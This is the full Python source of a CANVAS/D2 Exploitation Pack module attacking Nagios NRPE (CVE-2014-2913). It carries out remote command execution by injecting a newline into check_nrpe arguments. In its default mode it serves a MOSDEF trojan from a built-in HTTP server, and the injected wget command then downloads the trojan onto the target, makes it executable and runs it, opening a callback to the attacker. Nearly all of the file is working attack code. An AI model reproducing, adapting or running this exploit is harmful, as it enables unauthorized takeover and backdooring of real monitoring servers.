#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2014
#

import sys, time, os, thread

sys.path.append(".")
sys.path.append("../../")

import canvasengine

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from libs.spkproxy import header, body
from libs.canvasos import *
import StringIO
import urllib

# GUI info
NAME = "d2sec_nagios_nrpe.py"
DESCRIPTION = "Remote command execution in Nagios NRPE"

DOCUMENTATION = {}
DOCUMENTATION["VENDOR"] = "Nagios"
DOCUMENTATION["Repeatability"] = "Infinite"
DOCUMENTATION["Versions Affected"] = "Nagios NRPE <= 2.15"
DOCUMENTATION["Date public"] = "2014.04.17"
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/32925/"
DOCUMENTATION["CERT Advisory"] = ""
DOCUMENTATION["CVE Name"] = "CVE-2014-2913"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2913"
DOCUMENTATION["Notes"] = ""

VERSION = '1.0'
GTK2_DIALOG = 'dialog.glade2'

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]

NOTES = """
Usage:

-- Single command mode --
./3rdparty/D2SEC/d2sec_nagios_nrpe/d2sec_nagios_nrpe -t 172.16.244.141 -O cmd:"mkdir /tmp/pwned"

-- Automatic MOSDEF trojan download and exec for Linux --
./commandlineInterface.py -p 5555 -v 3
./3rdparty/D2SEC/exploits/d2sec_nagios_nrpe/d2sec_nagios_nrpe -t 172.16.244.141 -l 172.16.244.143 -d 5555 
"""

DOCUMENTATION["Notes"] = NOTES

class theexploit (tcpexploit):
    
  def __init__(self):
    tcpexploit.__init__(self)
    self.TROJANMODE = 0
    self.host = '' 
    self.port = 5666
    self.cmd = ''
    self.name = NAME
    self.check_nrpe = os.getcwd() + "/3rdparty/D2SEC/exploits/d2sec_nagios_nrpe/Ressources/check_nrpe"
    self.trojanname = 'mosdef'
	
  def neededListenerTypes(self):
    return [canvasengine.UNIVERSAL_MOSDEF]

  def maketrojan(self):
    from libs.canvasos import canvasos
    my_os = canvasos(self.os)
    my_os.arch = 'X86'
    self.log("Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
      return 0
    if self.os == "Windows":
      self.htafile = self.file4hta(self.mosdeftrojan)
      file(self.trojanname, "wb").write(self.htafile)
      self.setInfo("%s - done"%(NAME))
    else:
      file(self.trojanname, "wb").write(self.mosdeftrojan)
    ret = len(self.mosdeftrojan) != 0
    return ret

  def makesploit(self, clientheader, clientbody):
    h = header('SERVER')
    b = body()
    self.maketrojan()
    if clientheader.URL.count(self.trojanname):
      self.log("[D2] Sending MOSDEF trojan")
      f = open(self.trojanname, "rb")
      sploitstring = f.read()
      f.close()
      os.remove(self.trojanname)
      self.log("[D2] Sending %d bytes"%len(sploitstring))
      h.addHeader("Content-type","binary/octet-stream")
      h.addHeader("Connection","close")
      b.setBody(sploitstring)
    return h, b

  # Code from httpserver.py
  def listen(self):
    s = self.gettcplistener(80, "0.0.0.0")
    if not s:
      if self.port < 1024:
        self.log('[D2] Cannot listen on port %d - perhaps we need to be root or that port is already bound? ' \
          'you can try to bind to a higher port' % self.port)
      else:
        self.log('[D2] Cannot listen on port %d - perhaps that port is already bound ?' % self.port)
        return 0
    s.set_timeout(5)
    self.s = s
    return s

  def accept(self, s=None):
    """
      Try to accept one connection
      returns true if we found one
    """
    #we loop on this ,so no annoying printouts here
    #self.log("Accepting connection")
    if s == None:
      s = self.s
    try:
      infd,addr = s.accept()
    #except timeoutsocket.Timeout:
    except Exception, e:
      #self.log("Timed out - no accept yet")
      return
    if infd == -1:
      return
    #else we have an infd
    self.handle(infd)
    return True #handled connection

  def handle(self, infd):
    self.log('[D2] Handling connection')
    clientheader = header(state = "SERVER")
    #clientheader.ssl = self.ss
    ret = clientheader.readdata(infd)
    clientbody = body()
    if clientheader.gotGoodHeader():
      if clientheader.bodySize()>0 or clientheader.wasChunked:
        self.log('[D2] Reading body')
        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
        self.log('[D2] Read body')
    self.log('[D2] Creating exploit response')
    servheader,servbody = self.makesploit(clientheader,clientbody)
    self.log('[D2] Responding')
    bodydata = ''.join(servbody.data)
    #now we respond...
    response = ''
    response += '%s %s %s\r\n' % (servheader.version, servheader.status, servheader.msg)
    #self.log(response)
    for akey in servheader.headerValuesDict.keys():
      if akey not in [ "Content-Length", "Content-length"]:
        response += servheader.grabHeader(akey)
    self.log('[D2] Sending header data of %d bytes' % len(response))
    chunked = 0 #for now, eventually we'll send random chunks down the pipe.\..
    if not chunked:
      response += 'Content-Length: '+str(len(bodydata))+'\r\n'
    response += '\r\n'
    response += ''.join(bodydata)
    self.log('[D2] Total response length is %d bytes' % len(response))
    try:
      infd.sendall(response)
    except socket.error:
      self.log('[D2] Connection closed by peer')
    self.log('[D2] Response sent')
    infd.close() #connection close - later on we'll keep it.
    return

  def startHTTPServer(self):
    s = self.listen()
    if not s:
      self.log('[D2] Failed to listen - not running')
      return 0
    while 1:
      if self.state == self.HALT:
        self.s.close()
        break
      self.accept()
    return 1

  def _nagios_nrpe_exec(self, command):
    data = os.popen("%s -H %s -c check_users -a \"`echo -e \"\x0a %s \"` #\" 4"%(self.check_nrpe, self.host, command)).read()
    self.log(data)

  def nagios_nrpe_exec(self):
    if ';' in self.cmd:
      commands = self.cmd.split(';')
      for command in commands:
        self.log('[D2] Execute \"%s\"' % command)
        self._nagios_nrpe_exec(command)
        time.sleep(5)
    else:
      self._nagios_nrpe_exec(self.cmd) 
      self.log('[D2] Execute \"%s\"' % self.cmd)
    
    
  def getargs(self):	
    self.host = self.target.interface
    self.port = int(self.argsDict.get("port",self.port))
    if (self.argsDict.get("cmd", self.cmd) == ''):
      self.TROJANMODE = 1
      self.cmd = 'wget -O /tmp/%s %s/%s; chmod +x /tmp/%s; /tmp/%s' % (self.trojanname, self.callback.ip, self.trojanname, self.trojanname, self.trojanname)
      thread.start_new_thread(self.startHTTPServer,())
    else:
      self.cmd = self.argsDict.get("cmd", self.cmd)

  def nagios_nrpe_test_open(self):
    nfo = os.popen("%s -H %s"%(self.check_nrpe, self.host)).read()
    if "NRPE" in nfo:
      return 1
    return 0
  
  def run(self):
    self.getargs()
    self.setInfo('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
    time.sleep(5)
    if self.nagios_nrpe_test_open() == 0:
      return 0
    if self.TROJANMODE == 1:
      self.log('[D2] Create, download and execute Linux mosdef payload')
    self.nagios_nrpe_exec()
    if self.TROJANMODE == 1:
      #self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
      #self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
      while 1:
        time.sleep(1)
    self.log('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME,self.host,self.port))
    return 1

  def usage(self):
    print "Usage: "+sys.argv[0]+" -t target [-p port:5666] -l localip -d localport -O uri:<uri> -O cmd:<command> -O param:<value>" 
    print "If cmd parameter is null, a Linux mosdef payload will be used."
    sys.exit(0)
    
if __name__ == '__main__':
  print "Running CANVAS %s v %s" % (NAME,VERSION)
  app = theexploit()
  ret = standard_callback_commandline(app)
